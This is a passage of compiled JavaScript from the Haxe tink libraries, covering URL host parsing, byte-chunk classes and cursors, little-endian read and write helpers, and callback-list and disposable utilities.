			++_g1;
			HOST.match(host);
			var host1;
			var _g3 = HOST.matched(3);
			var _g4 = HOST.matched(2);
			if(_g4 == null) {
				var ipv4 = _g3;
				host1 = ipv4;
			} else if(_g3 == null) {
				var ipv6 = _g4;
				host1 = "[" + ipv6 + "]";
			} else {
				onError("invalid host " + host);
				host1 = null;
			}
			var port;
			var _g5 = HOST.matched(5);
			if(_g5 == null) {
				port = null;
			} else {
				var v = _g5;
				var _g6 = Std.parseInt(v);
				if(_g6 == null) {
					onError("invalid port " + v);
					port = null;
				} else {
					var p = _g6;
					port = p;
				}
			}
			_g.push(tink_url_Host._new(host1,port));
		}
		hosts = _g;
	}
	var path = FORMAT.matched(8);
	if(hosts.length > 0 && path.charAt(0) != "/") {
		path = "/" + path;
	}
	var this1 = { scheme : FORMAT.matched(2), payload : FORMAT.matched(3), hosts : hosts, auth : FORMAT.matched(6), path : tink_url_Path.ofString(path), query : FORMAT.matched(10), hash : FORMAT.matched(12)};
	return this1;
};
tink_Url.make = function(parts) {
	var parts1 = { payload : "", path : parts.path, query : parts.query, hosts : parts.hosts, auth : parts.auth, scheme : parts.scheme, hash : parts.hash};
	tink_Url.makePayload(parts1);
	var this1 = parts1;
	return this1;
};
var tink_SingleHostUrl = {};
tink_SingleHostUrl._new = function(v) {
	var this1 = v;
	return this1;
};
tink_SingleHostUrl.ofUrl = function(u) {
	var v;
	var _g = u.hosts;
	switch(_g.length) {
	case 0:
		v = u;
		break;
	case 1:
		var _g1 = _g[0];
		v = u;
		break;
	default:
		var v1 = _g;
		v = tink_Url.make({ path : u.path, query : u.query, hosts : [u.hosts[0]], auth : u.auth, scheme : u.scheme, hash : u.hash});
	}
	var this1 = v;
	return this1;
};
tink_SingleHostUrl.ofString = function(s) {
	return tink_SingleHostUrl.ofUrl(tink_Url.fromString(s));
};
var tink_chunk_ByteChunk = function(data,from,to) {
	this.data = data;
	this.from = from;
	this.to = to;
};
tink_chunk_ByteChunk.__name__ = true;
tink_chunk_ByteChunk.__interfaces__ = [tink_chunk_ChunkObject];
tink_chunk_ByteChunk.of = function(b) {
	if(b.length == 0) {
		return tink_Chunk.EMPTY;
	}
	var ret = new tink_chunk_ByteChunk(b.b.bufferValue,0,b.length);
	ret.wrapped = b;
	return ret;
};
tink_chunk_ByteChunk.__super__ = tink_chunk_ChunkBase;
tink_chunk_ByteChunk.prototype = $extend(tink_chunk_ChunkBase.prototype,{
	get_wrapped: function() {
		if(this.wrapped == null) {
			this.wrapped = haxe_io_Bytes.ofData(this.data);
		}
		return this.wrapped;
	}
	,getByte: function(index) {
		return this.data.bytes[this.from + index];
	}
	,flatten: function(into) {
		into.push(this);
	}
	,getLength: function() {
		return this.to - this.from;
	}
	,getSlice: function(from,to) {
		if(to > this.to - this.from) {
			to = this.to - this.from;
		}
		if(from < 0) {
			from = 0;
		}
		if(to <= from) {
			return null;
		} else if(to == this.to - this.from && from == 0) {
			return this;
		} else {
			return new tink_chunk_ByteChunk(this.data,this.from + from,to + this.from);
		}
	}
	,slice: function(from,to) {
		var _g = this.getSlice(from,to);
		if(_g == null) {
			return tink_Chunk.EMPTY;
		} else {
			var v = _g;
			return v;
		}
	}
	,blitTo: function(target,offset) {
		if(this.wrapped == null) {
			this.wrapped = haxe_io_Bytes.ofData(this.data);
		}
		target.blit(offset,this.wrapped,this.from,this.to - this.from);
	}
	,toBytes: function() {
		if(this.wrapped == null) {
			this.wrapped = haxe_io_Bytes.ofData(this.data);
		}
		return this.wrapped.sub(this.from,this.to - this.from);
	}
	,toString: function() {
		if(this.wrapped == null) {
			this.wrapped = haxe_io_Bytes.ofData(this.data);
		}
		return this.wrapped.getString(this.from,this.to - this.from);
	}
	,__class__: tink_chunk_ByteChunk
});
var tink_chunk_ChunkCursor = function() {
	this.currentByte = -1;
	this.currentPos = 0;
	this.length = 0;
	this.curLength = 0;
	this.curOffset = 0;
	this.curPartIndex = 0;
};
tink_chunk_ChunkCursor.__name__ = true;
tink_chunk_ChunkCursor.create = function(parts) {
	var ret = new tink_chunk_ChunkCursor();
	ret.parts = parts;
	ret.reset();
	return ret;
};
tink_chunk_ChunkCursor.prototype = {
	clone: function() {
		var ret = new tink_chunk_ChunkCursor();
		ret.parts = this.parts.slice();
		ret.curPart = this.curPart;
		ret.curPartIndex = this.curPartIndex;
		ret.curOffset = this.curOffset;
		ret.curLength = this.curLength;
		ret.length = this.length;
		ret.currentPos = this.currentPos;
		ret.currentByte = this.currentByte;
		return ret;
	}
	,reset: function() {
		this.length = 0;
		this.currentPos = 0;
		this.currentByte = -1;
		this.curOffset = 0;
		var _g = 0;
		var _g1 = this.parts;
		while(_g < _g1.length) {
			var p = _g1[_g];
			++_g;
			this.length += p.to - p.from;
		}
		this.curPart = this.parts[this.curPartIndex = 0];
		if(this.curPart != null) {
			var _this = this.curPart;
			this.curLength = _this.to - _this.from;
			var _this = this.curPart;
			this.currentByte = _this.data.bytes[_this.from];
		}
	}
	,flush: function() {
		var ret = this.left();
		this.shift();
		return ret;
	}
	,prune: function() {
		this.shift();
	}
	,add: function(chunk) {
		chunk.flatten(this.parts);
		this.reset();
	}
	,shift: function(chunk) {
		this.parts.splice(0,this.curPartIndex);
		var _g = this.parts[0];
		if(_g != null) {
			var chunk1 = _g;
			var _g = chunk1.getSlice(this.curOffset,this.curLength);
			if(_g == null) {
				this.parts.shift();
			} else {
				var rest = _g;
				this.parts[0] = rest;
			}
		}
		if(chunk != null) {
			this.add(chunk);
		} else {
			this.reset();
		}
	}
	,clear: function() {
		this.parts = [];
		this.reset();
	}
	,left: function() {
		if(this.curPart == null) {
			return tink_Chunk.EMPTY;
		}
		var _g = [];
		var _g1 = 0;
		var _g2 = this.curPartIndex;
		while(_g1 < _g2) {
			var i = _g1++;
			_g.push(this.parts[i]);
		}
		var left = _g;
		left.push(this.curPart.slice(0,this.curOffset));
		return tink_Chunk.join(left);
	}
	,right: function() {
		if(this.curPart == null) {
			return tink_Chunk.EMPTY;
		}
		var _g = [];
		var _g1 = this.curPartIndex;
		var _g2 = this.parts.length;
		while(_g1 < _g2) {
			var i = _g1++;
			_g.push(this.parts[i]);
		}
		var right = _g;
		if(right.length > 0) {
			right[0] = this.curPart.slice(this.curOffset,this.curLength);
		}
		return tink_Chunk.join(right);
	}
	,seek: function(seekable,options) {
		var _gthis = this;
		if(this.curPart == null || seekable == null || seekable.length == 0) {
			return haxe_ds_Option.None;
		}
		var max = seekable.length - 1;
		var first = seekable[0];
		var candidates = [];
		var count = 0;
		var copy = this.clone();
		copy.shift();
		var part = function(b,offset) {
			var data = b.data;
			var _g = b.from + offset;
			var _g1 = b.to;
			while(_g < _g1) {
				var i = _g++;
				var byte = data.bytes[i];
				if(candidates.length > 0) {
					var c = 0;
					while(c < count) {
						var pos = candidates[c];
						if(seekable[pos] == byte) {
							if(pos == max) {
								copy.moveTo(copy.currentPos + (i - (b.from + offset) - seekable.length + 1));
								var before = copy.left();
								var delta = before.getLength() + seekable.length;
								_gthis.moveTo(_gthis.currentPos + delta);
								if(options == null) {
									_gthis.shift();
								} else {
									var _g2 = options.withoutPruning;
									if(_g2 == null) {
										_gthis.shift();
									} else if(_g2 == false) {
										_gthis.shift();
									}
								}
								return haxe_ds_Option.Some(before);
							} else {
								candidates[c++] = pos + 1;
							}
						} else {
							count -= 1;
							var last = candidates.pop();
							if(count > c) {
								candidates[c] = last;
							}
						}
					}
				}
				if(byte == first) {
					count = candidates.push(1);
				}
			}
			copy.moveTo(copy.currentPos + (b.to - (b.from + offset)));
			return haxe_ds_Option.None;
		};
		var _g = part(this.curPart,this.curOffset);
		if(_g._hx_index == 1) {
			var _g1 = this.curPartIndex + 1;
			var _g2 = this.parts.length;
			while(_g1 < _g2) {
				var i = _g1++;
				var _g3 = part(this.parts[i],0);
				switch(_g3._hx_index) {
				case 0:
					var v = _g3.v;
					return haxe_ds_Option.Some(v);
				case 1:
					break;
				}
			}
			return haxe_ds_Option.None;
		} else {
			var v = _g;
			return v;
		}
	}
	,sweep: function(len) {
		var data = this.right().slice(0,len);
		this.moveTo(this.currentPos + len);
		return data;
	}
	,sweepTo: function(pos) {
		return this.sweep(pos - this.currentPos);
	}
	,moveBy: function(delta) {
		return this.moveTo(this.currentPos + delta);
	}
	,moveTo: function(position) {
		if(this.length == 0) {
			return 0;
		}
		if(position > this.length) {
			position = this.length - 1;
		}
		if(position < 0) {
			position = 0;
		}
		this.currentPos = position;
		if(position == this.length) {
			this.ffwd();
		} else {
			var _g = 0;
			var _g1 = this.parts.length;
			while(_g < _g1) {
				var i = _g++;
				var c = this.parts[i];
				var _g2 = c.to - c.from;
				var enough = _g2;
				if(enough > position) {
					this.curPart = c;
					this.curPartIndex = i;
					this.curOffset = position;
					this.curLength = c.to - c.from;
					this.currentByte = c.data.bytes[c.from + position];
					break;
				} else {
					var v = _g2;
					position -= v;
				}
			}
		}
		return this.currentPos;
	}
	,ffwd: function() {
		this.currentByte = -1;
		this.curLength = 0;
		this.curOffset = 0;
		this.curPart = null;
		this.curPartIndex = this.parts.length;
	}
	,next: function() {
		if(this.currentPos == this.length) {
			return false;
		}
		this.currentPos++;
		if(this.currentPos == this.length) {
			this.ffwd();
			return false;
		}
		if(this.curOffset == this.curLength - 1) {
			this.curOffset = 0;
			this.curPart = this.parts[++this.curPartIndex];
			var _this = this.curPart;
			this.curLength = _this.to - _this.from;
			var _this = this.curPart;
			this.currentByte = _this.data.bytes[_this.from];
		} else {
			var _this = this.curPart;
			this.currentByte = _this.data.bytes[_this.from + ++this.curOffset];
		}
		return true;
	}
	,__class__: tink_chunk_ChunkCursor
};
var tink_chunk_ChunkIterator = function(target) {
	this.target = target;
	this._hasNext = target.length > target.currentPos;
};
tink_chunk_ChunkIterator.__name__ = true;
tink_chunk_ChunkIterator.prototype = {
	hasNext: function() {
		return this._hasNext;
	}
	,next: function() {
		var ret = this.target.currentByte;
		this._hasNext = this.target.next();
		return ret;
	}
	,__class__: tink_chunk_ChunkIterator
};
var tink_chunk_ChunkTools = function() { };
tink_chunk_ChunkTools.__name__ = true;
tink_chunk_ChunkTools.readUInt8 = function(chunk,offset) {
	if(chunk.getLength() < offset + 1) {
		throw haxe_Exception.thrown("Out of range (chunk length = " + chunk.getLength() + ", read offset = " + offset + ", read length = " + 1 + ")");
	}
	var val = chunk.getByte(offset);
	return val;
};
tink_chunk_ChunkTools.readInt8 = function(chunk,offset) {
	var val = tink_chunk_ChunkTools.readUInt8(chunk,offset);
	if(val > 127) {
		return val - 256;
	} else {
		return val;
	}
};
tink_chunk_ChunkTools.readUInt16LE = function(chunk,offset) {
	if(chunk.getLength() < offset + 2) {
		throw haxe_Exception.thrown("Out of range (chunk length = " + chunk.getLength() + ", read offset = " + offset + ", read length = " + 2 + ")");
	}
	var first = chunk.getByte(offset);
	var last = chunk.getByte(offset + 1);
	return first + (last << 8);
};
tink_chunk_ChunkTools.readInt16LE = function(chunk,offset) {
	var val = tink_chunk_ChunkTools.readUInt16LE(chunk,offset);
	if(val > 32767) {
		return val - 65536;
	} else {
		return val;
	}
};
tink_chunk_ChunkTools.readUInt24LE = function(chunk,offset) {
	if(chunk.getLength() < offset + 3) {
		throw haxe_Exception.thrown("Out of range (chunk length = " + chunk.getLength() + ", read offset = " + offset + ", read length = " + 3 + ")");
	}
	var first = chunk.getByte(offset);
	var mid = chunk.getByte(offset + 1);
	var last = chunk.getByte(offset + 2);
	return first + (mid << 8) + (last << 16);
};
tink_chunk_ChunkTools.readInt24LE = function(chunk,offset) {
	var val = tink_chunk_ChunkTools.readUInt24LE(chunk,offset);
	if(val > 8388607) {
		return val - 16777216;
	} else {
		return val;
	}
};
tink_chunk_ChunkTools.readInt32LE = function(chunk,offset) {
	if(chunk.getLength() < offset + 4) {
		throw haxe_Exception.thrown("Out of range (chunk length = " + chunk.getLength() + ", read offset = " + offset + ", read length = " + 4 + ")");
	}
	var val = chunk.getByte(offset) + (chunk.getByte(offset + 1) << 8) + (chunk.getByte(offset + 2) << 16) + (chunk.getByte(offset + 3) << 24);
	return val;
};
tink_chunk_ChunkTools.readDoubleLE = function(chunk,offset) {
	var l = tink_chunk_ChunkTools.readInt32LE(chunk,0);
	var h = tink_chunk_ChunkTools.readInt32LE(chunk,4);
	return haxe_io_FPHelper.i64ToDouble(l,h);
};
tink_chunk_ChunkTools.readNullTerminatedString = function(chunk,offset) {
	try {
		return new haxe_io_BytesInput(chunk.toBytes(),offset).readUntil(0);
	} catch( _g ) {
		return chunk.toString();
	}
};
tink_chunk_ChunkTools.writeUInt8 = function(v) {
	var bytes = new haxe_io_Bytes(new ArrayBuffer(1));
	bytes.b[0] = v & 255;
	return tink_chunk_ByteChunk.of(bytes);
};
tink_chunk_ChunkTools.writeInt8 = function(v) {
	var bytes = new haxe_io_Bytes(new ArrayBuffer(1));
	v &= 255;
	if(v < 0) {
		v += 256;
	}
	bytes.b[0] = v;
	return tink_chunk_ByteChunk.of(bytes);
};
tink_chunk_ChunkTools.writeUInt16LE = function(v) {
	var bytes = new haxe_io_Bytes(new ArrayBuffer(2));
	bytes.b[0] = v & 255;
	bytes.b[1] = v >>> 8 & 255;
	return tink_chunk_ByteChunk.of(bytes);
};
tink_chunk_ChunkTools.writeInt16LE = function(v) {
	return tink_chunk_ChunkTools.writeUInt16LE(v);
};
tink_chunk_ChunkTools.writeUInt24LE = function(v) {
	var bytes = new haxe_io_Bytes(new ArrayBuffer(3));
	bytes.b[0] = v & 255;
	bytes.b[1] = v >>> 8 & 255;
	bytes.b[2] = v >>> 16 & 255;
	return tink_chunk_ByteChunk.of(bytes);
};
tink_chunk_ChunkTools.writeInt24LE = function(v) {
	return tink_chunk_ChunkTools.writeUInt24LE(v);
};
tink_chunk_ChunkTools.writeInt32LE = function(v) {
	var bytes = new haxe_io_Bytes(new ArrayBuffer(4));
	bytes.b[0] = v & 255;
	bytes.b[1] = v >>> 8 & 255;
	bytes.b[2] = v >>> 16 & 255;
	bytes.b[3] = v >>> 24 & 255;
	return tink_chunk_ByteChunk.of(bytes);
};
tink_chunk_ChunkTools.writeDoubleLE = function(v) {
	var bytes = new haxe_io_Bytes(new ArrayBuffer(8));
	var i64 = haxe_io_FPHelper.doubleToI64(v);
	var l = i64.low;
	var h = i64.high;
	bytes.b[0] = l & 255;
	bytes.b[1] = l >>> 8 & 255;
	bytes.b[2] = l >>> 16 & 255;
	bytes.b[3] = l >>> 24 & 255;
	bytes.b[4] = h & 255;
	bytes.b[5] = h >>> 8 & 255;
	bytes.b[6] = h >>> 16 & 255;
	bytes.b[7] = h >>> 24 & 255;
	return tink_chunk_ByteChunk.of(bytes);
};
tink_chunk_ChunkTools.lpad = function(chunk,pad,length) {
	if(pad.getLength() != 0) {
		while(chunk.getLength() < length) chunk = tink_Chunk.concat(pad,chunk);
	}
	return chunk;
};
tink_chunk_ChunkTools.rpad = function(chunk,pad,length) {
	if(pad.getLength() != 0) {
		while(chunk.getLength() < length) chunk = tink_Chunk.concat(chunk,pad);
	}
	return chunk;
};
tink_chunk_ChunkTools.check = function(chunk,offset,length) {
	if(chunk.getLength() < offset + length) {
		throw haxe_Exception.thrown("Out of range (chunk length = " + chunk.getLength() + ", read offset = " + offset + ", read length = " + length + ")");
	}
};
var tink_chunk_CompoundChunk = function() {
};
tink_chunk_CompoundChunk.__name__ = true;
tink_chunk_CompoundChunk.__interfaces__ = [tink_chunk_ChunkObject];
tink_chunk_CompoundChunk.asCompound = function(c) {
	if(((c) instanceof tink_chunk_CompoundChunk)) {
		return c;
	} else {
		return null;
	}
};
tink_chunk_CompoundChunk.cons = function(a,b) {
	var _g = a.getLength();
	var _g1 = b.getLength();
	if(_g == 0) {
		if(_g1 == 0) {
			return tink_Chunk.EMPTY;
		} else {
			return b;
		}
	} else if(_g1 == 0) {
		return a;
	} else {
		var la = _g;
		var lb = _g1;
		var _g = tink_chunk_CompoundChunk.asCompound(a);
		var _g1 = tink_chunk_CompoundChunk.asCompound(b);
		if(_g == null) {
			if(_g1 == null) {
				return tink_chunk_CompoundChunk.create([a,b],2);
			} else {
				var v = _g1;
				if(v.depth < 100) {
					return tink_chunk_CompoundChunk.create([a,b],v.depth + 1);
				} else {
					var flat = [];
					v.flatten(flat);
					b.flatten(flat);
					return tink_chunk_CompoundChunk.create(flat,2);
				}
			}
		} else if(_g1 == null) {
			var v = _g;
			if(v.depth < 100) {
				return tink_chunk_CompoundChunk.create([a,b],v.depth + 1);
			} else {
				var flat = [];
				v.flatten(flat);
				b.flatten(flat);
				return tink_chunk_CompoundChunk.create(flat,2);
			}
		} else {
			var a = _g;
			var b = _g1;
			var depth = a.depth > b.depth ? a.depth : b.depth;
			return tink_chunk_CompoundChunk.create(a.chunks.concat(b.chunks),depth);
		}
	}
};
tink_chunk_CompoundChunk.create = function(chunks,depth) {
	var ret = new tink_chunk_CompoundChunk();
	var offsets = [0];
	var length = 0;
	var _g = 0;
	while(_g < chunks.length) {
		var c = chunks[_g];
		++_g;
		offsets.push(length += c.getLength());
	}
	ret.chunks = chunks;
	ret.offsets = offsets;
	ret.length = length;
	ret.depth = depth;
	return ret;
};
tink_chunk_CompoundChunk.__super__ = tink_chunk_ChunkBase;
tink_chunk_CompoundChunk.prototype = $extend(tink_chunk_ChunkBase.prototype,{
	getByte: function(i) {
		var index = this.findChunk(i);
		return this.chunks[index].getByte(i - this.offsets[index]);
	}
	,getLength: function() {
		return this.length;
	}
	,findChunk: function(target) {
		var min = 0;
		var max = this.offsets.length - 1;
		while(min + 1 < max) {
			var guess = min + max >> 1;
			if(this.offsets[guess] > target) {
				max = guess;
			} else {
				min = guess;
			}
		}
		return min;
	}
	,flatten: function(into) {
		var _g = 0;
		var _g1 = this.chunks;
		while(_g < _g1.length) {
			var c = _g1[_g];
			++_g;
			c.flatten(into);
		}
	}
	,slice: function(from,to) {
		var idxFrom = this.findChunk(from);
		var idxTo = this.findChunk(to);
		if(idxFrom == idxTo) {
			var offset = this.offsets[idxFrom];
			return this.chunks[idxFrom].slice(from - offset,to - offset);
		}
		var ret = this.chunks.slice(idxFrom,idxTo + 1);
		var c = ret[0];
		ret[0] = c.slice(from - this.offsets[idxFrom],this.offsets[idxFrom + 1]);
		var c = ret[ret.length - 1];
		ret[ret.length - 1] = c.slice(0,to - this.offsets[idxTo]);
		return tink_chunk_CompoundChunk.create(ret,this.depth);
	}
	,blitTo: function(target,offset) {
		var _g = 0;
		var _g1 = this.chunks.length;
		while(_g < _g1) {
			var i = _g++;
			this.chunks[i].blitTo(target,offset + this.offsets[i]);
		}
	}
	,toString: function() {
		return this.toBytes().toString();
	}
	,toBytes: function() {
		var ret = new haxe_io_Bytes(new ArrayBuffer(this.length));
		this.blitTo(ret,0);
		return ret;
	}
	,__class__: tink_chunk_CompoundChunk
});
var tink_chunk_Seekable = {};
tink_chunk_Seekable._new = function(a) {
	var this1 = a;
	return this1;
};
tink_chunk_Seekable.get_length = function(this1) {
	return this1.length;
};
tink_chunk_Seekable.get = function(this1,index) {
	return this1[index];
};
tink_chunk_Seekable.ofChunk = function(c) {
	return tink_chunk_Seekable.ofBytes(c.toBytes());
};
tink_chunk_Seekable.ofBytes = function(b) {
	var _g = [];
	var _g1 = 0;
	var _g2 = b.length;
	while(_g1 < _g2) {
		var i = _g1++;
		_g.push(b.b[i]);
	}
	var this1 = _g;
	return this1;
};
tink_chunk_Seekable.ofString = function(s) {
	return tink_chunk_Seekable.ofBytes(haxe_io_Bytes.ofString(s));
};
var tink_chunk_nodejs_BufferChunk = function(buffer) {
	this.buffer = buffer;
};
tink_chunk_nodejs_BufferChunk.__name__ = true;
tink_chunk_nodejs_BufferChunk.__interfaces__ = [tink_chunk_ChunkObject];
tink_chunk_nodejs_BufferChunk.prototype = {
	getByte: function(i) {
		return this.buffer[i];
	}
	,getCursor: function() {
		return tink_chunk_ByteChunk.of(this.toBytes()).getCursor();
	}
	,flatten: function(into) {
		tink_chunk_ByteChunk.of(this.toBytes()).flatten(into);
	}
	,getLength: function() {
		return this.buffer.length;
	}
	,slice: function(from,to) {
		if(to > this.getLength()) {
			to = this.getLength();
		}
		if(from < 0) {
			from = 0;
		}
		if(to <= from) {
			return tink_Chunk.EMPTY;
		} else if(to == this.getLength() && from == 0) {
			return this;
		} else {
			return new tink_chunk_nodejs_BufferChunk(this.buffer.slice(from,to));
		}
	}
	,toString: function() {
		return this.buffer.toString();
	}
	,toBytes: function() {
		var copy = js_node_buffer_Buffer.allocUnsafe(this.buffer.length);
		this.buffer.copy(copy);
		return js_node_buffer__$Buffer_Helper.bytesOfBuffer(copy);
	}
	,blitTo: function(target,offset) {
		var data = target.b;
		this.buffer.copy(js_node_buffer_Buffer.from(data.buffer,data.byteOffset,target.length),offset);
	}
	,__class__: tink_chunk_nodejs_BufferChunk
};
var tink_core_Annex = function(target) {
	this.target = target;
	this.registry = new haxe_ds_ObjectMap();
};
tink_core_Annex.__name__ = true;
tink_core_Annex.prototype = {
	__class__: tink_core_Annex
};
var tink_core_Callback = {};
tink_core_Callback._new = function(f) {
	var this1 = f;
	return this1;
};
tink_core_Callback.toFunction = function(this1) {
	return this1;
};
tink_core_Callback.invoke = function(this1,data) {
	if(tink_core_Callback.depth < 500) {
		tink_core_Callback.depth++;
		this1(data);
		tink_core_Callback.depth--;
	} else {
		tink_core_Callback.defer(function() {
			this1(data);
		});
	}
};
tink_core_Callback.fromNiladic = function(f) {
	return f;
};
tink_core_Callback.fromMany = function(callbacks) {
	return function(v) {
		var _g = 0;
		while(_g < callbacks.length) {
			var callback = callbacks[_g];
			++_g;
			tink_core_Callback.invoke(callback,v);
		}
	};
};
tink_core_Callback.defer = function(f) {
	process.nextTick(f);
};
var tink_core_LinkObject = function() { };
tink_core_LinkObject.__name__ = true;
tink_core_LinkObject.__isInterface__ = true;
tink_core_LinkObject.prototype = {
	__class__: tink_core_LinkObject
};
var tink_core_CallbackLinkRef = function() {
};
tink_core_CallbackLinkRef.__name__ = true;
tink_core_CallbackLinkRef.__interfaces__ = [tink_core_LinkObject];
tink_core_CallbackLinkRef.prototype = {
	cancel: function() {
		var this1 = this.link;
		if(this1 != null) {
			this1.cancel();
		}
	}
	,__class__: tink_core_CallbackLinkRef
};
var tink_core_CallbackLink = {};
tink_core_CallbackLink._new = function(link) {
	var this1 = new tink_core_SimpleLink(link);
	return this1;
};
tink_core_CallbackLink.cancel = function(this1) {
	if(this1 != null) {
		this1.cancel();
	}
};
tink_core_CallbackLink.dissolve = function(this1) {
	if(this1 != null) {
		this1.cancel();
	}
};
tink_core_CallbackLink.noop = function() {
};
tink_core_CallbackLink.toFunction = function(this1) {
	if(this1 == null) {
		return tink_core_CallbackLink.noop;
	} else {
		return $bind(this1,this1.cancel);
	}
};
tink_core_CallbackLink.toCallback = function(this1) {
	if(this1 == null) {
		return tink_core_CallbackLink.noop;
	} else {
		return $bind(this1,this1.cancel);
	}
};
tink_core_CallbackLink.fromFunction = function(f) {
	var this1 = new tink_core_SimpleLink(f);
	return this1;
};
tink_core_CallbackLink.join = function(this1,b) {
	return new tink_core__$Callback_LinkPair(this1,b);
};
tink_core_CallbackLink.fromMany = function(callbacks) {
	var this1 = new tink_core_SimpleLink(function() {
		if(callbacks != null) {
			var _g = 0;
			while(_g < callbacks.length) {
				var cb = callbacks[_g];
				++_g;
				if(cb != null) {
					cb.cancel();
				}
			}
		} else {
			callbacks = null;
		}
	});
	return this1;
};
var tink_core_SimpleLink = function(f) {
	this.f = f;
};
tink_core_SimpleLink.__name__ = true;
tink_core_SimpleLink.__interfaces__ = [tink_core_LinkObject];
tink_core_SimpleLink.prototype = {
	cancel: function() {
		if(this.f != null) {
			this.f();
			this.f = null;
		}
	}
	,__class__: tink_core_SimpleLink
};
var tink_core__$Callback_LinkPair = function(a,b) {
	this.dissolved = false;
	this.a = a;
	this.b = b;
};
tink_core__$Callback_LinkPair.__name__ = true;
tink_core__$Callback_LinkPair.__interfaces__ = [tink_core_LinkObject];
tink_core__$Callback_LinkPair.prototype = {
	cancel: function() {
		if(!this.dissolved) {
			this.dissolved = true;
			var this1 = this.a;
			if(this1 != null) {
				this1.cancel();
			}
			var this1 = this.b;
			if(this1 != null) {
				this1.cancel();
			}
			this.a = null;
			this.b = null;
		}
	}
	,__class__: tink_core__$Callback_LinkPair
};
var tink_core__$Callback_ListCell = function(cb,list) {
	if(cb == null) {
		throw haxe_Exception.thrown("callback expected but null received");
	}
	this.cb = cb;
	this.list = list;
};
tink_core__$Callback_ListCell.__name__ = true;
tink_core__$Callback_ListCell.__interfaces__ = [tink_core_LinkObject];
tink_core__$Callback_ListCell.prototype = {
	invoke: function(data) {
		if(this.list != null) {
			this.cb(data);
		}
	}
	,clear: function() {
		this.cb = null;
		this.list = null;
	}
	,cancel: function() {
		if(this.list != null) {
			var list = this.list;
			this.cb = null;
			this.list = null;
			if(--list.used <= list.cells.length >> 1) {
				list.compact();
			}
		}
	}
	,__class__: tink_core__$Callback_ListCell
};
var tink_core_Disposable = function() { };
tink_core_Disposable.__name__ = true;
tink_core_Disposable.__isInterface__ = true;
tink_core_Disposable.prototype = {
	__class__: tink_core_Disposable
};
var tink_core_OwnedDisposable = function() { };
tink_core_OwnedDisposable.__name__ = true;
tink_core_OwnedDisposable.__isInterface__ = true;
tink_core_OwnedDisposable.__interfaces__ = [tink_core_Disposable];
tink_core_OwnedDisposable.prototype = {
	__class__: tink_core_OwnedDisposable
};
var tink_core_SimpleDisposable = function(dispose) {
	this.disposeHandlers = [];
	this.f = dispose;
};
tink_core_SimpleDisposable.__name__ = true;
tink_core_SimpleDisposable.__interfaces__ = [tink_core_OwnedDisposable];
tink_core_SimpleDisposable.noop = function() {
};
tink_core_SimpleDisposable.prototype = {
	get_disposed: function() {
		return this.disposeHandlers == null;
	}
	,ondispose: function(d) {
		var _g = this.disposeHandlers;
		if(_g == null) {
			d();
		} else {
			var v = _g;
			v.push(d);
		}
	}
	,dispose: function() {
		var _g = this.disposeHandlers;
		if(_g != null) {
			var v = _g;
			this.disposeHandlers = null;
			var f = this.f;
			this.f = tink_core_SimpleDisposable.noop;
			f();
			var _g = 0;
			while(_g < v.length) {
				var h = v[_g];
				++_g;
				h();
			}
		}
	}
	,__class__: tink_core_SimpleDisposable
};
var tink_core_CallbackList = function(destructive) {
	if(destructive == null) {
		destructive = false;
	}
	this.onfill = function() {
	};
	this.ondrain = function() {
	};
	this.busy = false;
	this.queue = [];
	this.used = 0;
	var _gthis = this;
	tink_core_SimpleDisposable.call(this,function() {
		if(!_gthis.busy) {
			_gthis.destroy();
		}
	});
	this.destructive = destructive;
	this.cells = [];
};
tink_core_CallbackList.__name__ = true;
tink_core_CallbackList.__super__ = tink_core_SimpleDisposable;
tink_core_CallbackList.prototype = $extend(tink_core_SimpleDisposable.prototype,{
	get_length: function() {
		return this.used;
	}
	,release: function() {
		if(--this.used <= this.cells.length >> 1) {
			this.compact();
		}
	}
	,destroy: function() {
		var _g = 0;
		var _g1 = this.cells;
		while(_g < _g1.length) {
			var c = _g1[_g];
			++_g;
			c.cb = null;
			c.list = null;
		}
		this.queue = null;
		this.cells = null;
		if(this.used > 0) {
			this.used = 0;
			var fn = this.ondrain;
			if(tink_core_Callback.depth < 500) {
				tink_core_Callback.depth++;
				fn();
				tink_core_Callback.depth--;
			} else {
				tink_core_Callback.defer(fn);
			}
		}
	}
	,drain: function() {
		var fn = this.ondrain;
		if(tink_core_Callback.depth < 500) {
			tink_core_Callback.depth++;
			fn();
			tink_core_Callback.depth--;
		} else {
			tink_core_Callback.defer(fn);
		}
	}
	,add: function(cb) {
		if(this.disposeHandlers == null) {
			return null;
		}
		var node = new tink_core__$Callback_ListCell(cb,this);
		this.cells.push(node);
		if(this.used++ == 0) {
			var fn = this.onfill;
			if(tink_core_Callback.depth < 500) {
				tink_core_Callback.depth++;
				fn();
				tink_core_Callback.depth--;
			} else {
				tink_core_Callback.defer(fn);
			}
		}
		return node;
	}
	,invoke: function(data) {
		var _gthis = this;
		if(tink_core_Callback.depth < 500) {
			tink_core_Callback.depth++;
			if(_gthis.disposeHandlers != null) {
				if(_gthis.busy) {
					if(_gthis.destructive != true) {
						var _g = $bind(_gthis,_gthis.invoke);
						var data1 = data;
						var tmp = function() {
							_g(data1);
						};
						_gthis.queue.push(tmp);
					}
				} else {
					_gthis.busy = true;
					if(_gthis.destructive) {
						_gthis.dispose();
					}
					var length = _gthis.cells.length;
					var _g1 = 0;
					var _g2 = length;
					while(_g1 < _g2) {
						var i = _g1++;
						var _this = _gthis.cells[i];
						if(_this.list != null) {
							_this.cb(data);
						}
					}
					_gthis.busy = false;
					if(_gthis.disposeHandlers == null) {
						_gthis.destroy();
					} else {
						if(_gthis.used < _gthis.cells.length) {
							_gthis.compact();
						}
						if(_gthis.queue.length > 0) {
							(_gthis.queue.shift())();
						}
					}
				}
			}
			tink_core_Callback.depth--;
		} else {
			tink_core_Callback.defer(function() {
				if(_gthis.disposeHandlers != null) {
					if(_gthis.busy) {
						if(_gthis.destructive != true) {
							var _g = $bind(_gthis,_gthis.invoke);
							var data1 = data;
							var tmp = function() {
								_g(data1);
							};
							_gthis.queue.push(tmp);
						}
					} else {
						_gthis.busy = true;
						if(_gthis.destructive) {
							_gthis.dispose();
						}
						var length = _gthis.cells.length;
						var _g1 = 0;
						var _g2 = length;
						while(_g1 < _g2) {
							var i = _g1++;
							var _this = _gthis.cells[i];
							if(_this.list != null) {
								_this.cb(data);
							}
						}
						_gthis.busy = false;
						if(_gthis.disposeHandlers == null) {
							_gthis.destroy();
						} else {
							if(_gthis.used < _gthis.cells.length) {
								_gthis.compact();
							}
							if(_gthis.queue.length > 0) {
								(_gthis.queue.shift())();
							}
						}
					}
				}
			});
		}
	}
	,compact: function() {
		if(this.busy) {
			return;
